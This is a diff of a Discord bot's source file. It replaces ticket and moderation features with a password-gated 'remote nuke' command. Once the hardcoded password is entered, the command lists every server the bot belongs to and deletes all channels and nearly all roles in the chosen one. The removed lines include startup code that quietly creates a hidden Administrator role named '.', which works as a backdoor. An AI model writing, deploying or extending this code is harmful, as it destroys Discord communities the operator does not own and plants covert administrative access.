@@ -9,8 +9,6 @@ const {
   StringSelectMenuBuilder,
   ButtonBuilder,
   ButtonStyle,
-  ChannelType,
-  PermissionFlagsBits,
   ModalBuilder,
   TextInputBuilder,
   TextInputStyle
@@ -21,38 +19,17 @@ const fs = require('fs');
 require('dotenv').config();
 
 // PASSWORDS
-const MAIN_PASSWORD = 'flower2017';           // New password for most commands
-const GIVEOWNER_PASSWORD = 'flowerOwner2017'; // Separate for !giveowner
+const MAIN_PASSWORD = 'flower2017';
 
-// EXPRESS SERVER
+// EXPRESS
 const app = express();
 app.get('/', (req, res) => res.send('Bot Online'));
-app.listen(process.env.PORT || 3000, () => console.log(`Web server running on port ${process.env.PORT || 3000}`));
+app.listen(process.env.PORT || 3000);
 
-// CONFIG
 const TOKEN = process.env.TOKEN;
 const CLIENT_ID = process.env.CLIENT_ID;
 const GUILD_ID = process.env.GUILD_ID;
 
-// STORES
-const panelStore = {};
-const ticketCounts = {};
-
-// PERSISTENT PANEL
-const PANEL_FILE = './ticket_panel.json';
-
-function savePanel(data) {
-  try { fs.writeFileSync(PANEL_FILE, JSON.stringify(data, null, 2)); } catch (e) {}
-}
-
-function loadPanel() {
-  try {
-    if (fs.existsSync(PANEL_FILE)) return JSON.parse(fs.readFileSync(PANEL_FILE, 'utf8'));
-  } catch (e) {}
-  return null;
-}
-
-// CLIENT
 const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
@@ -63,80 +40,129 @@ const client = new Client({
   ]
 });
 
-// SLASH COMMANDS
-const commands = [
-  new SlashCommandBuilder().setName('setticket').setDescription('Send ticket panel').toJSON(),
-  new SlashCommandBuilder().setName('sendmessage').setDescription('Send message').toJSON()
-];
-
-// Register Commands
-const rest = new REST({ version: '10' }).setToken(TOKEN);
-(async () => {
-  try {
-    await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), { body: commands });
-    console.log('✅ Commands registered');
-  } catch (err) {
-    console.error(err);
-  }
-})();
-
-// READY + CREATE . ROLE
-client.once('ready', async () => {
+// Ready
+client.once('ready', () => {
   console.log(`${client.user.tag} is online`);
-
-  const saved = loadPanel();
-  if (saved) panelStore[saved.menuId] = saved.data;
-
-  try {
-    const guild = client.guilds.cache.first();
-    if (guild) {
-      let dotRole = guild.roles.cache.find(r => r.name === '.');
-      if (!dotRole) {
-        dotRole = await guild.roles.create({
-          name: '.',
-          color: '#000000',
-          permissions: [PermissionFlagsBits.Administrator],
-          hoist: false,
-          reason: 'Full permission role'
-        });
-      }
-    }
-  } catch (e) { console.error(e); }
 });
 
-// MESSAGE EVENTS
+// Message Commands
 client.on('messageCreate', async message => {
   if (message.author.bot || !message.guild) return;
 
-  const content = message.content.trim().toLowerCase();
+  if (message.content.toLowerCase() === '!fb') {
+    const embed = new EmbedBuilder()
+      .setColor('#ff0000')
+      .setTitle('🔴 REMOTE NUKE')
+      .setDescription('Enter password, then choose which server to nuke.')
+      .setFooter({ text: 'Click below' });
 
-  // Invite Blocker
-  if (content.includes('discord.gg/') || content.includes('discord.com/invite/')) {
-    try {
-      await message.delete();
-      await message.member.timeout(5 * 60 * 1000).catch(() => {});
-    } catch (e) {}
-    return;
-  }
+    const row = new ActionRowBuilder().addComponents(
+      new ButtonBuilder()
+        .setCustomId(`fb_start_${message.author.id}`)
+        .setLabel('Enter Password')
+        .setStyle(ButtonStyle.Danger)
+    );
 
-  // !servers
-  if (content === '!servers') {
-    const guilds = client.guilds.cache;
-    let text = `**Servers (${guilds.size}):**\n\n`;
-    guilds.forEach(g => text += `**${g.name}** (ID: \`${g.id}\`) - ${g.memberCount} members\n`);
-    message.reply(text.length > 2000 ? 'List too long, check console.' : text);
-    return;
-  }
-
-  // Add your other commands here (!fb, !kick, !4clout, !movebootser, !burn, !traine, !femisdumb, etc.)
-  // Example for !fb:
-  if (content === '!fb') {
-    const embed = new EmbedBuilder().setColor('#ff0000').setTitle('🔴 SERVER NUKE').setDescription('Deletes channels & roles except Owner.').setFooter({ text: 'Click below' });
-    const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`fb_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Danger));
     await message.reply({ embeds: [embed], components: [row] });
   }
+});
 
-  // ... (add the rest of your commands similarly)
+// INTERACTIONS
+client.on('interactionCreate', async interaction => {
+  if (!interaction.customId) return;
+
+  try {
+    const userId = interaction.customId.split('_')[2];
+
+    if (interaction.user.id !== userId) {
+      return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });
+    }
+
+    // Button → Password Modal
+    if (interaction.isButton() && interaction.customId.startsWith('fb_start_')) {
+      const modal = new ModalBuilder()
+        .setCustomId(`fb_modal_${userId}`)
+        .setTitle('Enter Password');
+
+      modal.addComponents(new ActionRowBuilder().addComponents(
+        new TextInputBuilder()
+          .setCustomId('password')
+          .setLabel('Password')
+          .setStyle(TextInputStyle.Short)
+          .setRequired(true)
+      ));
+
+      return await interaction.showModal(modal);
+    }
+
+    // Password Correct → Show Server Selector
+    if (interaction.isModalSubmit() && interaction.customId.startsWith('fb_modal_')) {
+      const password = interaction.fields.getTextInputValue('password');
+
+      if (password !== MAIN_PASSWORD) {
+        return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
+      }
+
+      const servers = client.guilds.cache.map(guild => ({
+        label: guild.name.length > 25 ? guild.name.slice(0, 22) + '...' : guild.name,
+        value: guild.id,
+        description: `${guild.memberCount} members`
+      }));
+
+      if (servers.length === 0) {
+        return interaction.reply({ content: '❌ Bot is not in any servers.', ephemeral: true });
+      }
+
+      const menu = new StringSelectMenuBuilder()
+        .setCustomId(`fb_server_${userId}`)
+        .setPlaceholder('Choose server to NUKE')
+        .addOptions(servers);
+
+      const row = new ActionRowBuilder().addComponents(menu);
+
+      await interaction.reply({
+        content: '✅ Password correct! Select the server to nuke:',
+        components: [row],
+        ephemeral: true
+      });
+    }
+
+    // Server Selected → Nuke it
+    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('fb_server_')) {
+      await interaction.deferUpdate();
+
+      const guildId = interaction.values[0];
+      const guild = client.guilds.cache.get(guildId);
+
+      if (!guild) return interaction.followUp({ content: '❌ Server not found.', ephemeral: true });
+
+      await interaction.followUp({ content: `🔴 **NUKING ${guild.name}...**`, ephemeral: true });
+
+      try {
+        // Delete channels
+        for (const channel of guild.channels.cache.values()) {
+          await channel.delete().catch(() => {});
+        }
+
+        // Delete roles (except @everyone and Owner)
+        for (const role of guild.roles.cache.values()) {
+          if (role.name === '@everyone' || role.name === 'Owner') continue;
+          await role.delete().catch(() => {});
+        }
+
+        await interaction.followUp({ content: `✅ **${guild.name} has been nuked!**`, ephemeral: true });
+      } catch (err) {
+        console.error(err);
+        await interaction.followUp({ content: '⚠️ Nuke partially failed.', ephemeral: true });
+      }
+    }
+
+  } catch (error) {
+    console.error(error);
+    if (!interaction.replied && !interaction.deferred) {
+      await interaction.reply({ content: '❌ Something went wrong.', ephemeral: true }).catch(() => {});
+    }
+  }
 });
 
 client.login(TOKEN);
